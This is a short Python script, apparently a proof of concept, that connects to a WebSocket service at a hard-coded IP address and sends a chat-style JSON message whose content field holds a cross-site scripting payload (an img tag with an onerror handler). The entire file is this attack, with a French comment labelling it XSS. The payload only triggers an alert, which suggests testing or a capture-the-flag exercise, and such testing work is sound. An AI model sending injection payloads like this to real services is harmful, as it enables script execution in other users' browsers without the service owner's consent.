import websocket
import json

URL = "ws://51.159.16.22:8040"

# XSS via le champ content
payload = {
    "type": "message",
    "content": "<img src=x onerror=alert(1)>",
    "user": "Guest"
}

ws = websocket.create_connection(URL)
ws.send(json.dumps(payload))
print(ws.recv())
ws.close()